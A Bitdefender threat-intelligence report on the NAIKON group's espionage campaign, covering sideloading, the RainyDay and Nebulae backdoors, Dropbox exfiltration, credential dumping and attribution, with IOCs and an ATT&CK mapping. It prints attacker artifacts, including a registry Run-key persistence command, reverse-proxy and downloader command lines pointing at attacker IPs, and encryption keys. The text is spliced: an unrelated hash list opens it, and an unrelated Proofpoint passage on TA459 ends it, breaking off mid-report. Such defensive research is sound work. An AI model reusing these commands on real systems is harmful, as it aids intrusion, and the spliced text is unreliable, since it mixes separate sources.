38066751CB6C39691904FFBEF86FE3BDFA737E4BA64ADD4DD90358245FA2B775 3307.BIN
89B3463664FF13EA77256094844C9CF69D3E408D3DAF9FFAD3AA18AF39BAB410 TERMSHOST.EXE
D341E3A9133E534CA35D5CCC54B8A79F93FF0C917790E7D5F73FEDAA480A6B93 A7
442E4A8D35F9DE21D5CBD9A695A24B9AC8120E548119C7F9F881EE16AD3761E6 BASHF
7674E0B69D848E0B9FF8B82DF8671F9889F33AB1A664F299BCCE13744E08954C BASHG
7051C9AF966D1C55A4096E2AF2E6670D4FC75E00B2B396921A79549FB16D03D4 LOWERV2.SH
2F5BF7F1EA7A84828AA70F1140774F3D4CE9985D05A676C8535420232E2AF87E POOLS.TXT
BA29D8A259D33D483833387FAD9C7231FBB3BEB9F4E0603B204523607C622A03 CONFIG.JSON
7C2DBC0D74E01A5E7C13B4A41D3A1F7564C165BD532E4473ACEA6F46405D0889 R88.SH
D44E767132D68FDB07C23C848FF8C28EFE19D1B7C070161B7BD6C0CCFC858750 ROOTV2.SH
35CB971DAAFD368B71AD843A4E0B81C80225EC20D7679CFBF78E628EBCADA542 INSTALL.EXE
654EC27EA99C44EDC03F1F3971D2A898B9F1441DE156832D1507590A47B41190 ZZYO
F808A42B10CF55603389945A549CE45EDC6A04562196D14F7489AF04688F12BC XBASHY
725EFD0F5310763BC5375E7B72DBB2E883AD90EC32D6177C578A1C04C1B62054 REG9.SCT
D7FBD2A4DB44D86B4CF5FA4202203DACFEFD6FFCA6A0615DCA5BC2A200AD56B6 M.PNG
ECE3CFDB75AAABC570BF38AF6F4653F73101C1641CE78A4BB146E62D9AC0CD50 HIDDEN EXECUTABLE IN M.PNG

Author: Victor VRABIE – Security Researcher, Cyber Threat Intelligence Lab @ Bitdefender About NAIKON NAIKON is a threat actor that has been active for more than a decade. Likely tied with China, the group focuses on high profile targets such as government agencies and military organizations in the South Asia region. About sideloading DLL hijacking and other sideloading techniques have been around for as long as the Windows operating system. They are so frequent and so easily exploitable that there are tomes of information on how to both attack and defend against. But, while simple in theory, defending against sideloading is still challenging in the ever-increasing complexity of the software world. Subsequently, side-loading techniques have become extremely attractive compromise techniques for both commercial and state-sponsored threat actors. The purpose of this report is to provide details about tactics, techniques and procedures, as well as tools and infrastructure information of the attackers. The findings reveal their strategy to remain stealthy by mimicking legitimate applications that are running on individual infected machines. The collected evidence suggest that the aim of the APT group was espionage and data exfiltration. A recent publication from Kaspersky mentions a malware called FoundCore that seems to be the same with the backdoor we call RainyDay based on several similarities: The method of side-loading which uses the rdmin.src file, The shellcode used for payload extraction, Payload particularities such as the starting of four threads that implements the same functionality. Introduction This report details a Bitdefender Labs investigation that focuses on the abuse of vulnerable legitimate software, which eventually lead to uncovering a long-running operation of a notorious APT group known as NAIKON. Background
4 Victimology During our investigation we identified that the victims of this operation are military organizations located in Southeast Asia. The malicious activity was conducted between June 2019 and March 2021. In the beginning of the operation the threat actors used Aria-Body loader and Nebulae as the first stage of the attack. From our observations, starting with September 2020, the threat actors included the RainyDay backdoor in their toolkit. The purpose of this operation was cyber-espionage and data theft. Legitimate software abused by NAIKON: ARO 2012 Tutorial 8.0.12.0 VirusScan On-Demand Scan Task Properties (McAfee, Inc.) Sandboxie COM Services (BITS) 3.55.06 (SANDBOXIE L.T.D) Outlook Item Finder 11.0.5510 (Microsoft Corporation) Mobile Popup Application 16.00 (Quick Heal Technologies (P) Ltd.)
5 Toolset The main instrument used in this operation is the RainyDay backdoor through which several other custom-made or public tools were brought during the attack life cycle. In this section, technical details about the toolset used in the kill chain will be provided. Using the RainyDay backdoor, the actors performed reconnaissance, uploaded its reverse proxy tools and scanners, executed the password dump tools, performed lateral movement, achieved persistence, all to compromise the victims’ network and to get to the information of interest. The following diagram illustrates the toolset used by the RainyDay Backdoor: Tools executed by RainyDay backdoor The persistence mechanism is usually installed manually, as the actor tends to mimic legitimate applications, but in some cases, it is automatically set by the binaries themselves. The intention to hide through the legitimate software was observed during the deployment of exfiltration tools – the sbiedll.dll tool is used to automatically collect files with a given extension and to upload them to Dropbox; the tool masquerading itself as a chrome process. The second backdoor, that we call Nebulae, is supposedly used as a measure of precaution to not lose the persistence in case any signs of infections gets detected. For lateral movement, WMIC.exe and schtasks.exe with admin domain credentials were used, a strong indicator that credentials were stolen at some point during the attack.
6 Rainyday backdoor execution During the investigation, we observed a particular technique to be extensively used for tool execution, namely SideLoading. This technique was always used for RainyDay execution and there was always a vulnerable executable along with a DLL file and the rdmin.src file containing the encrypted backdoor payload. We also noticed 2 flows of execution of the RainyDay backdoor, one of which is the execution of a SFX file that drops all 3 files in a temporary folder: The RainyDay execution from SFX The other flow was the execution of a vulnerable executable after manually planting all files in the same folder: Direct RainyDay execution The SFX file used in the operation contains the legitimate Mobile Popup Application from Quick Heal AntiVirus, the DLL file pc2msupp.dll that extracts the payload from rdmin.src.
7 Another side-loading triad used by the actor was the Outlook Item Finder and the outllib.dll that obtains the payload from rdmin.src. After the malicious DLL file is loaded, it changes the flow of the legitimate executable to run code that reads the content of the rdmin.src file, decrypts the shellcode by XOR-ing the content with the value of 0x7A, and finally, executes the shellcode. The result is the presence of the RainyDay in memory. If visualizing the RainyDay memory dump, available on VirusTotal in a hex viewer it’s easy to observe the config section that appears to be obfuscated by XOR-ing with the 0x2D value. After decryption the config looks as shown in the image below: RainyDay config At a glance, the configuration data contains the C&C address, a folder name, a service description, a mutex name and a service name, all this information being confirmed during the analysis. As shown in the image, the C&C address of the RainyDay extracted from the SFX sample is cat.suttiphong.com. Next step taken was collecting more rdmin.src samples from our file collection, which led us to more RainyDay payloads, as shown in the following table: rdmin.src C&C addresses 78782a24805b52713cb63ba3cad2569b905edea96ca3609f8464f1b7c1ba05dc asp.asphspes.com ff13e4561460f00a2777ce7a70902d65fd7b8c38a5aa90ac1d8bd868c271da29 www.tnelgnmc.com www.dthjxc.com 5dc87097c6ff85df9a6ca03f35ad9a2fc0b7b1a3083a4a30d1d64b51f88e452a 172.245.23.143 185.199.226.106 0569ea0c080e9ed28d2cf6dce03123d93d100fd59e3a6f4719ff4a0aebf5ebb6 172.245.244.86 One of the samples has many debug logs that indicate that all payloads in their initial form are DLL files that export a function called fdvbfa, which is actually the entry point of the RainyDay backdoor. Its execution starts 4 threads with very suggestive functionality: “[*] Start to create register service thread...” - it registers the current process as a service process “[*] Start to create main work thread...” - it contacts the C&C server and executes the received commands “[*] Start to create self protect thread...” - it sets the SE_DACL_PROTECTED for process protection “[*] Start to create hide service thread...”- it manipulates service settings in order to hide the service activity More about backdoor capabilities that may be executed by the main thread are listed below: MAJOR code command note 1004 CMD_MAJOR_FILE File manipulation, file upload and download 1005 CMD_MAJOR_CMD Cmd shell
8 MAJOR code command note 1009 CMD_MAJOR_UNISTALL Uninstall by deleting the service and triad files 1010 CMD_MAJOR_PROCESS Process termination and listing 1011 CMD_MAJOR_SERVICES Service manipulation 1013 CMD_MAJOR_SCREENSHOT Screen Capture with subsequent sending to c&c 1190 CMD_DEAL_HTTP_UPLOAD 1191 Unknown name The communication is realized through the TCP and HTTP (if the first method is not working). An interesting fact is that the traffic seems to be encrypted using RC4 algorithm and all samples we analyzed uses the same key - “aefbA_(*vaER#$78B?>C”. The binaries FINDER.exe, MOBPOPUP.exe and the SFX file were found under many file paths: FINDER.exe C:\windows\lsm.exe
C:\Program Files (x86)\Google\Update\GooleUpdates.exe
C:\ProgramData\Chrome\lsm.exe
C:\Windows\Chrome.exe
C:\Program Files\(x86)\Google\Chrome\Chrome.exe
C:\ProgramData\Keven\front.exe
C:\ProgramData\Chrome\dwm.exe
C:\StorageReports\Scheduled\front.exe MOBPOPUP.exe c:\windows\sploor.exe
%ProgramData%\Adobe\explorer.exe SFX %PROGRAM_FILES%\vmware\vmware tools\vmtools.exe By looking at the specific file paths used to hide the abused files and the malicious dropper, we assume that the actors try to mimic the legitimate software that is running on the machine. This fact is particularly highlighted by the vmtools. exe that differs by one letter from the legitimate executable vmtoolsd.exe.
We made similar observations in services and scheduled task names used to achieve persistence and to perform lateral movement: Malicious service “sstpsvces” mimics the legitimate Secure Socket Tunneling Protocol Service(SstpSvc) Malicious service “GoogleUpdate” mimics google update services Malicious service “taskmgr” mimics the legitimate taskmgr command Malicious task “sharpcifs” mimics software name from SharpCifs - Cross-Platform SMB Client Other malicious task names observed - “Check”, “ChromeCheck”, “googleupdate” It is worth mentioning that the actors used WMIC.exe and schtaks.exe for the lateral movement step. Nebulae Backdoor
9 The story behind the Nebulae tool started after the analysis of a process tree of the RainyDay process. The data revealed a process executed by the previously described backdoor with the following file path - C:\windows\help\help\ dwm.exe. Further analysis revealed that the binary has backdoor capabilities. By clustering more suspected similar binaries, we observed a pattern for a few of them – the Nebulae string appears as the ExportName of the file. Moreover, we found a similar sample with the following pdb path - C:\Projects\New\ ne\NebulaeForPool_ConfigEXE - Explorer__1\Release\Nebulae.pdb and all those facts inspired us to call the tool Nebulae. In this operation, the Nebulae backdoor appears in the form of executable, as well as DLL file, the last form being used mostly for side-loading technique. A particular example of an abused file is the VirusScan On-Demand Scan Task Properties: The loading of Nebulae as vsodscpl.dll There are more exploited executables used for the Nebulae loading as we found a sample that exports 2 particular functions, StartUserModeBrowserInjection and StopUserModeBrowserInjection, indicating that the actors try to impersonate the chrome_frame_helper.dll. The analysis of the most recent samples showed that the backdoor is capable of: Getting LogicalDrive information (Drive type, FreeSpace, VolumeInformation) Listing, moving and deleting files and directories Executing a process using CreateProcess or through a CMD shell Listing and terminating processes Downloading and uploading files from and to C&C Communication with the C&C is realized by sending and receiving packets of a fixed form through a TCP connection. The format of packets can be visualized on the diagram below and represent an array of bytes of dynamic length with a 77 bytes header that stores the RC4 key used for payload encryption (the key is created by concatenating each fourth byte):
10 Packet format The address of C&C is encrypted using XOR operation with the key value set to the length of the string. This method of encrypting the C&C address is the same in the almost all samples of Nebulae we were able to collect – the single exception being an old sample – 3b9629122f33d5f354026923fdd3e499f43b01054c3dc74224aa242a4dd397c1, in which the C&C address is XOR-ed with the 0x3b value. The persistence installation for a Nebulae sample was captured in a process tree of a RainyDay process, where the latter executes the following command line: reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion Run /v narsris /t REG_SZ /d \”C:\\windows\\help\\help\\dwm. exe\” /f Another artifact showing more details about the Nebulae persistence is a binary we found having the %PROGRAM_ FILES_COMMON%\system\ado\dll.exe file path that creates a service dot1 with the “Windows Update Agent1” as DisplayName that is set to load the %SYSWOW64%\dot1.dll file. The identified dot1.dll file is a Nebulae sample that exports the ServiceMain function. The data we obtained so far tell almost nothing about the role of the Nebulae in this operation, but the presence of a persistence mechanism could mean that it is used as backup access point to victim in the case of a negative scenario for actors. More about samples of Nebulae we found are listed in the following tables: hash filename C&C 71755f4cd827551d0cf3419d0afc548ffdc020d0b9359a71a1a2039d27d5a37d dwm.exe php.tripadvisorsapp.com 54738bb403a25b005bf145d4ed2a3719b0c4869360eb82776171c1b6d5ec0952 dot1.dll news.dgwktifrn.com 0c438622b62bf03a33e3e25d3ff1afea740111c2d90a2b9659eddd7a5021cd5d nta.dll mail.tripadvisorsapp.com 2181fdf09d22e0b55db7e70914eec71ff98d55f0f4899a9f5ef9dba1f2ad9792 vsodscpl. dll java.tripadvisorsapp.com ee9f11a530df4950981daea65dc029e05f76516d2ac9ce4541ccf89a44e26285 vsodscpl. dll osde.twifwkeyh.com c5c39979728f635b324dfcb7e32cbd6c4cc877ff4f9bd39113c7a2722f49d399 vsodscpl. dll aloha.fekeigawy.com 592c36bc4117f150f8fce1b54d064eb14bd3236b3f729ba12750aed3bb6006b4 nta.dll www.wahatmrjn.com Samples related to the current operation
11 hash C&C bad4fba4b2863ddbf85aaabf1c77f60ea972dd2ea39d7b7963b862b0b4aacbb5 dns.seekvibega.com dc64e5497bbb2e128a821a382e1bd02a7057982913f2da673c4897c64ff5090c news.dgwktifrn.com 1df627dab5349caa21b7796747299cc00d5def8f1f9af2bfd93d61a74455151e news.dgwktifrn.com 6bce8eb669aa383397943579dd3432ea875227733b4430489fe985d326b5edb5 cent.myanmarnewsrecent.com 3b9629122f33d5f354026923fdd3e499f43b01054c3dc74224aa242a4dd397c1 http.jmrmfitym.com Samples found by similarity criteria (not necessarily related to the current operation) Exfiltration Tools The same source of information – a process tree of the RainyDay revealed a new tool and a new case of side-loading shown on the schema: Exfiltration tool loading The legitimate SandboxieBITS.exe file and the malicious file collector sbiedll.dll were found in the C:\Program Files (x86)\Google\Chrome\ directory under the names Chrome.exe and sbiedll.dll, respectively. The tool collects recently changed files with a specific extension and uploads them to Dropbox. So, the specific directory and the file names were chosen in order to mask the traffic to Dropbox as originating from a legitimate source and subsequently, to fly under the radar. The sbiedll.dll exports two functions, SbieApi_Log and SbieDll_Hook, that matches the static imports for the SandboxieBITS.exe binary, the SbieDll_Hook being the entrypoint of the exfiltration tool. Once loaded, the tool tries to assign to the registry key value named contom under the Run key the file path of the executable In order to achieve persistence via Registry keys. Next steps during the execution correspond to the start of two decoupled components that run in separated threads: the collection component and the uploading component. Analyzing the collecting component, we found the following: It uses ReadDirectoryChangeW for folder monitoring, where the target folders are all fixed and remote drives. The monitoring mechanism is practically identical to the one available on Github. All files that match the given criteria are copied to C:\ProgramData\Adobe\temp. Each event received after a file change (FILE_ACTION_ADDED, FILE_ACTION_REMOVED, FILE_ACTION_ MODIFIED, FILE_ACTION_RENAMED_OLD_NAME, FILE_ACTION_RENAMED_NEW_NAME) is logged in the C:\ ProgramData\Adobe\temp\dhcpinit.dll.
12 The criteria of filtering mainly consist of having an extension from the following list: doc, docx, pdf, ppt, pptx, xls, xlsx, rtf, txt, rar, zip, jpg, jpeg, bmp The uploading component is responsible for periodic listing of the C:\ProgramData\Adobe\temp folder and for uploading the found files to Dropbox using the public HTTP API. The credentials for the Dropbox account are encrypted in the binary along with the remote path. Another particularity of the upload module consists of encrypting the content of files with AES128-CBC using the “1234567890123459” value for key and IV. The entire logic is implemented in a window procedure tied to a window named WindowsProject1 as the developers preferred to use the SetTimer function in combination with the WM_TIMER window event for periodic uploading. The upload may occur at a specific time of the day if there is a file named LICENSE in the root directory of the Dropbox. The file contains strings that indicates the hours when to upload the collected files and such content looks like the one presented below: 07:00;08:00;09:00;09:20;10;11;12;14:30;15:30;16:30;17:30;19:30;20:30;21:30;01:00 A file similar with sbiedll.dll is available on VirtusTotal. Another tool suspected to be used for data exfiltration is swissfileknife binary that is available for public download from the osdn.net site. Despite the fact that there is evidence that RainyDay executes this tool multiple times, we can only assume that it was used for exfiltration as per the available description of command line parameters. Credential Harvesting The evidences we collected show that there was used at least one tool for password dumping. One file we found at C:\PerfLogs\p8.exe is a sample of QuarksPwDump that certainly was used by RainyDay in order to obtain local passwords and domain cached credentials. In C:\ProgramData\ folder, two other tools are found and their purpose is to collect browser credentials. The files we referred to are: %COMMON_APPDATA%\bpd.exe is browserpassworddump %COMMON_APPDATA%\ has a suggestive pdb path - C:\Users\adnanonline\documents\visual studio 2015\ Projects\chrome-passwords\Release\chrome-passwords.pdb
13 Network Tools During the investigation we identified a netbios scanner, multiple samples of the Ladon scanner and two different types of proxy tools used in the operation. And all these tools contribute to the generation of a broader overview of the infrastructure used by actors. The netbios scanner has different file paths: C:\PerfLogs\winhp.exe %WINDOWS%\debug\winhp.exe C:\PerfLogs\taskmgr.exe It was used for network inspection and for machine identification by scanning the private IP range X.X.0.0/24. This discovery step is particularly interesting as it characterizes how the actor behaves - immediately after the execution of the scanner, we noticed the execution of net.exe and ping.exe tools, which were probably used for checking if a machine is up and running. Further actions correspond to the lateral movement step by running a command using wmic.exe on a remote machine. Other tool used by RainyDay is boost_proxy_client, called so because of use of the C++ boost libraries and because of the pdb path found in a sample. We obtained 2 samples of the tool located at: abb48990eaabd5203c35bd26a0bb51e81e8eb2532d22d22fb2a6566bbda4c6a4 C:\Recovery\dwm.exe C:\PerfLogs\winlogin.exe 56085b27e7145bb2cfbf2d33fba30359d1429b507e3b9251cfdced50bba1f07f c:\perflogs\winlogon.exe There are a few differences between these two samples as the 56085b27e7145bb2cfbf2d33fba30359d1429b507e3b9251cfdced50bba1f07f has the pdb path set to Z:\data\cc0\ boost_proxy\boost_proxy_client_http_and_socks5\Release\boost_proxy_client.pdb and accepts 2 types of command lines: <host> <port> and <host><port><`http`|`socks5`><proxy_host><proxy_port>. The option for using a proxy is absent in the abb48990eaabd5203c35bd26a0bb51e81e8eb2532d22d22fb2a6566bbda4c6a4, but it seems to encrypt the traffic send to the destination as it contains OpenSSL code. Information showing more about the actor’s infrastructure was extracted from the command line of these binaries and are as follows: 150.109.184.127 3333 150.109.184.127 4444 150.109.178.252 2356 150.109.184.127 4152 150.109.184.127 1111 150.109.184.127 4528 150.109.184.127 792 150.109.184.127 7859 150.109.184.127 7954 150.109.184.127 15784 Yet another reverse proxy tool from the actor’s arsenal is the Go-written tool RcSocks v1.0. We were able to collect 2 samples of this type: %COMMON_APPDATA%\adobe\scupdate.exe %WINDOWS%\\csc\winsrvc.exe, where scupdate. exe was executed by an instance of Rainyday with the “scupdate -c 124.156.241.24:8550” command line. Speaking of tools written in Go, another one pops on the radar and this time it is a scanner known as LadonGo. The file
14 C:\ProgramData\Adobe\wusa64 was executed at the same time as the %COMMON_APPDATA%\adobe\scupdate.exe RcSocks sample. The command line given to the wusa64.exe indicates that the intention of actor is to attempt a bruteforce attack against the SSH service on a local machine, likely to be used for lateral movement. More samples of Ladon.exe (.Net version) were found during the investigation, but we didn’t find any arguments to connect them to the operation other than the sample location (e.g. %WINDOWS%\debug\mmc.exe): 3a10cf56e2402bd42658ba7bbac72afb81de7f37c5a3f881f891c503dc0c039f d09b3d2bd3488f09949445f19eb90bfabb2395be1bc7a20054c84c93a44700ff 98598ea719deb88d0416a313c67a653c807d7b69d13229fcacc352404035e052 Other Tools There are two more pieces of malicious tools we noticed to be run by the RainyDay that are worth describing: C:\cpqsystem\logs.exe is a HexINI loader that decrypts a shellcode from a .ini file and runs it – we were unable to find the payload used in the operation. C:\PerfLogs\winsrv.exe is a downloader that was executed with the “47.241.127.190 443” command line. Attribution Our research confidently points to an operation conducted by the Naikon group based on the extraction of the C&C addresses from Nebulae samples. The particular domain dns.seekvibega.com obtained from such a sample points out to the Naikon infrastructure, as previously documented in a CheckPoint research. Moreover, several C&C addresses in the same component are suspected by ThreatConnect to belong to the Naikon infrastructure (e.g. www.wahatmrjn. com). We found more compelling evidence ito support our hypothesis during the triage of the suspicious files. The results of this process are the identification of a new case of side-loading and three malicious files (obtained from the same machine where we noticed RainyDay and other IOCs) belonging to Aria-Body loader malware family, the family that was previously reported to be used by Naikon: Side-loading of Aria-Body loader
15 The C&C addresses of two of aria-body loader samples are rose.twifwkeyh.com and guinnbandesh.com as the third sample uses an IP from a private range. Despite the fact that we don’t have any visibility into what these samples of Aria-Body loader executed, they are certainly connected with the operation we investigated, as there is a sample of Nebulae with the osde.twifwkeyh.com C&C address that uses a subdomain of the same domain twifwkeyh.com. The previously mentioned Nebulae sample was used by the actor, as it was observed to be used in this operation together with outllib.dll that loads the RainyDay backdoor. IOCS
2c4af3fa3918b715b3a0b3e5232196089b7ffcb2406ea01f5243ab5e04ecb2c8 SFX file 5cbfa1047527a44bf8cdf830077c11ab5d54f7663c8c0a91676cb1157005c14d MOBPOPUP.exe e44969dd3573abbe0a3d0b7ea56856e9c5284be3ead6bc228fe5799410ed812e pc2msupp.dll 268426b01ac967c470b16ddcb3125fc7c234861c6e33e8b330400fbd3b403e4c rdmin.src 9fc74d8830fa5d2cee8254fbcc02e9737cf417433efb3e5f026e4500afc94270 FINDER.exe 5cbfa1047527a44bf8cdf830077c11ab5d54f7663c8c0a91676cb1157005c14d MOBPOPUP.exe c5b29d3205155d79ca3a9d5d4d8b363740f9d91f2d6563d37855357532e3eb10 RainyDay memdump 32d12a1660c00b8636075aa15363f8b0917391a2ec416d2398cf819c71b09ef9 outllib.dll 4bb2c2e40d394ae50c4c6043ec94f7e9417a23759390f6518ffdf2f7a5d4fcc8 outllib.dll bd92139712bdb12a4ca1b10b45c07bd0dd5253e6d9821fb3059b7e489773e400 outllib.dll 3f8a9a7776a56bbb7dc4bffd5f1549ec64e9170c97a622e1b59199dd3c620e82 outllib.dll e44969dd3573abbe0a3d0b7ea56856e9c5284be3ead6bc228fe5799410ed812e pc2msupp.dll 3d0e91c7d8fde05d12e83519b66c4778a97f9fb5358e2de6c8105f221f26a3d1 pc2msupp.dll 037e17b85dfd4671dc748701aa31b028438e44edee620070510438bcb56f022d pc2msupp.dll 608d2beebb5b6bfc23bcbfb2e12a73fd0b8ae707136a163d747115dc384d0875 pc2msupp.dll ebead09ed1d471ff85ae7584c9f2043338d004ee782680085992e9203e29d249 rdmin.rsc loader 71755f4cd827551d0cf3419d0afc548ffdc020d0b9359a71a1a2039d27d5a37d dwm.exe (Nebulae) 1e712adae2a543bf2fbf41691416b350c3a90561ab5f6590e520f833a9a587ad VirusScan On-Demand Scan Task Properties b7011dc545a20049efb67f0fbc37aff3cae226a38370dcb79513ba472ec712bb dll.exe (persistence intaller for dot1.dll) 54738bb403a25b005bf145d4ed2a3719b0c4869360eb82776171c1b6d5ec0952 dot1.dll (Nebulae) 0c438622b62bf03a33e3e25d3ff1afea740111c2d90a2b9659eddd7a5021cd5d nta.dll(Nebulae) 2181fdf09d22e0b55db7e70914eec71ff98d55f0f4899a9f5ef9dba1f2ad9792 vsodscpl.dll(Nebulae) ee9f11a530df4950981daea65dc029e05f76516d2ac9ce4541ccf89a44e26285 vsodscpl.dll(Nebulae) c5c39979728f635b324dfcb7e32cbd6c4cc877ff4f9bd39113c7a2722f49d399 vsodscpl.dll(Nebulae) 592c36bc4117f150f8fce1b54d064eb14bd3236b3f729ba12750aed3bb6006b4 nta.dll(Nebulae) bad4fba4b2863ddbf85aaabf1c77f60ea972dd2ea39d7b7963b862b0b4aacbb5 Nebulae dc64e5497bbb2e128a821a382e1bd02a7057982913f2da673c4897c64ff5090c Nebulae 1df627dab5349caa21b7796747299cc00d5def8f1f9af2bfd93d61a74455151e Nebulae
16 6bce8eb669aa383397943579dd3432ea875227733b4430489fe985d326b5edb5 Nebulae 3b9629122f33d5f354026923fdd3e499f43b01054c3dc74224aa242a4dd397c1 Nebulae 4849af113960f473749acf71d11d56854589cf21d623e66c7408bebd5ad0608f SandboxieBITS.exe 99d4467c2637962a698dfb20be4b1167876132746ff106004bb4249646b428a6 sbiedll.dll 89132f9bd84c25539ba3b8fc2080e037b3221d16730d4b5605f6b9d3906ad38c 0eb2a690eecf3e04135ae05df44f672f69bc15ebbacc6141a288b96a4d751182 sfk.exe - swissfileknife 3423c48fe1358e89e4e3b5160db9148c40bcd5a5085f049fc32f077681edfb25 p8.exe - QuarksPwDump d57847db5458acabc87daee6f30173348ac5956eb25e6b845636e25f5a56ac59 bpd.exe 3247d21bc9bbbd8df670a82e24be754a2d58d2511ee64aff0a1e3756cd288236 chromeupdate.exe c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e NetBios scanner abb48990eaabd5203c35bd26a0bb51e81e8eb2532d22d22fb2a6566bbda4c6a4 winlogin.exe (boost_proxy_client) 56085b27e7145bb2cfbf2d33fba30359d1429b507e3b9251cfdced50bba1f07f winlogon.exe (boost_proxy_client) 4d5ca91ced0f0bd8be137f6d7fae907ebca07c46ac0eda49428fc96d0674aad6 scupdate.exe(RcSocks) dd01e3703e728d8afc58eaaad15bbd184b137dd7ad738c009acc50004a438624 winsrvc.exe(RcSocks) e27878becab770fbbebfd9f10d4eb6ee1a109a2f1987335762b654fadb1caf7d wusa64.exe(LAdonGo) 8b831ee82975d43456ee861115272d3923e17f07a702eb057feeed8ce76ff4ca logs.exe(HecINI loader) dd18c757309e61a664aec7be70ca6a47f0f3c317dff96f19e73bd2cd3b2f4f12 winsrv.exe(downloader) 68c6b06225368def17b3189ee441c319c00dcac3bb574ea036a3aabeaa6c3bbf rose.twifwkeyh.com Aria-Body loader a5a95306e33ee3f4cf658055f3afd08b1cdf1d56687a81a261b5a1a50cf96634 guinnbandesh.com Aria-Body loader c3ee61690c3d4ca257961b010ffd354720b47f96eb7a42ad2335615081dd40cb Aria-Body loader 18a98c2d905a1da1d9d855e86866921e543f4bf8621faea05eb14d8e5b23b60c ARO 2012 Tutorial - 8.0.12.0 cat.suttiphong.com RainyDay C&C server php.tripadvisorsapp.com news.dgwktifrn.com mail.tripadvisorsapp.com java.tripadvisorsapp.com osde.twifwkeyh.com aloha.fekeigawy.com www.wahatmrjn.com Nebulae C&C servers 124.156.241.24 150.109.184.127 150.109.178.252 47.241.127.190 IPs
17 ATT&CK Tool Representation RainyDay Nebulae QuarksPwDump Persistence Installer for Nebulae LadonGo NBTScan Dropbox Exfiltration tool Operational activity Legend Tactic Technique Tools Execution Command and Scripting Interpreter (T1059) Scheduled Task/Job (T1053) System Services: Service Execution (T1569.002) Windows Management Instrumentation (T1047) Persistence Registry Run Keys / Startup Folder (T1547.001) Windows Service (T1543.003) Scheduled Task/Job (T1053) Valid Accounts (T1078)
18 Tactic Technique Tools Defense Evasion Hidden Files and Directories (T1564.001) Obfuscated Files or Information (T1027) File and Directory Permissions Modification (T1222) Hijack Execution Flow: DLL Side-Loading (T1574.002) Modify Registry (T1112) Process Injection (T1055) Indicator Removal on Host: File Deletion (T1070.004) Masquerading (T1036) Masquerading: Masquerade Task or Service (T1036.004) Masquerading: Match Legitimate Name or Location (T1036.005) Valid Accounts: Domain Accounts (T1078.002) Credential Access OS Credential Dumping (T1003) OS Credential Dumping: Security Account Manager (T1003.002) OS Credential Dumping: Cached Domain Credentials (T1003.005) Discovery System Information Discovery (T1082) System Owner/User Discovery (T1033) File and Directory Discovery (T1083) Process Discovery (T1057) System Network Configuration Discovery (T1016) System Service Discovery (T1007) System Network Connections Discovery (T1049) Remote System Discovery (T1018) Network Service Scanning (T1046)
19 Tactic Technique Tools Lateral Movement Lateral Tool Transfer (T1570) Remote Services: SMB/Windows Admin Shares (T1021.002) Collection Data Staged (T1074) Data Staged: Local Data Staging (T1074.001) Screen Capture (T1113) Data from Removable Media (T1025) Data from Local System (T1005) Command and Control Application Layer Protocol: Web Protocols (T1071.001) Data Obfuscation (T1001) Non-Application Layer Protocol (T1095) Protocol Tunneling (T1572) Exfiltration Automated Exfiltration (T1020) Exfiltration Over Web Service (T1567) Exfiltration Over C2 Channel (T1041) Mitre techniques mapping Naik 04/27/21April 23, 2021 4:09 pm04/27/21 Founded 2001, Romania Number of employees 1800+ Headquarters Enterprise HQ – Santa Clara, CA, United States Technology HQ – Bucharest, Romania WORLDWIDE OFFICES USA & Canada: Ft. Lauderdale, FL | Santa Clara, CA | San Antonio, TX | Toronto, CA Europe: Copenhagen, DENMARK | Paris, FRANCE | München, GERMANY | Milan, ITALY | Bucharest, Iasi, Cluj, Timisoara, ROMANIA | Barcelona, SPAIN | Dubai, UAE | London, UK | Hague, NETHERLANDS Australia: Sydney, Melbourne UNDER THE SIGN OF THE WOLF A trade of brilliance, data security is an industry where only the clearest view, sharpest mind and deepest insight can win — a game with zero margin of error. Our job is to win every single time, one thousand times out of one thousand, and one million times out of one million. And we do. We outsmart the industry not only by having the clearest view, the sharpest mind and the deepest insight, but by staying one step ahead of everybody else, be they black hats or fellow security experts. The brilliance of our collective mind is like a luminous Dragon-Wolf on your side, powered by engineered intuition, created to guard against all dangers hidden in the arcane intricacies of the digital realm. This brilliance is our superpower and we put it at the core of all our game-changing products and solutions. Proudly Serving Our Customers Bitdefender provides solutions and services for small business and medium enterprises, service providers and technology integrators. We take pride in the trust that enterprises such as Mentor, Honeywell, Yamaha, Speedway, Esurance or Safe Systems place in us. Leader in Forrester’s inaugural Wave™ for Cloud Workload Security NSS Labs “Recommended” Rating in the NSS Labs AEP Group Test SC Media Industry Innovator Award for Hypervisor Introspection, 2nd Year in a Row Gartner® Representative Vendor of Cloud-Workload Protection Platforms Trusted Security Authority Bitdefender is a proud technology alliance partner to major virtualization vendors, directly contributing to the development of secure ecosystems with VMware, Nutanix, Citrix, Linux Foundation, Microsoft, AWS, and Pivotal. Through its leading forensics team, Bitdefender is also actively engaged in countering international cybercrime together with major law enforcement agencies such as FBI and Europol, in initiatives such as NoMoreRansom and TechAccord, as well as the takedown of black markets such as Hansa. Starting in 2019, Bitdefender is also a proudly appointed CVE Numbering Authority in MITRE Partnership. Dedicated To Our +20.000 Worldwide Partners A channel-exclusive vendor, Bitdefender is proud to share success with tens of thousands of resellers and distributors worldwide. CRN 5-Star Partner, 4th Year in a Row. Recognized on CRN’s Security 100 List. CRN Cloud Partner, 2nd year in a Row More MSP-integrated solutions than any other security vendor 3 Bitdefender Partner Programs - to enable all our partners – resellers, service providers and hybrid partners – to focus on selling Bitdefender solutions that match their own specializations RECOGNIZED BY LEADING ANALYSTS AND INDEPENDENT TESTING ORGANIZATIONS TECHNOLOGY ALLIANCES Why Bitdefender On April 20, Proofpoint observed a targeted campaign focused on financial analysts working at top global financial firms operating in Russia and neighboring countries. These analysts were linked by their coverage of the telecommunications industry, making this targeting very similar to, and likely a continuation of, activity described in our “In Pursuit of Optical Fibers and Troop Intel” blog. This time, however, attackers opportunistically used spear-phishing emails with a Microsoft Word attachment exploiting the recently patched CVE-2017-0199 to deploy the ZeroT Trojan, which in turn downloaded the PlugX Remote Access Trojan (RAT). Proofpoint is tracking this attacker, believed to operate out of China, as TA459. The actor typically targets Central Asian countries, Russia, Belarus, Mongolia, and others. TA549 possesses a diverse malware arsenal including PlugX, NetTraveler, and ZeroT. [1][2][3]

In this blog, we also document other 2017 activity so far by this attack group, including their distribution of ZeroT malware and secondary payloads PCrat/Gh0st.

Analysis

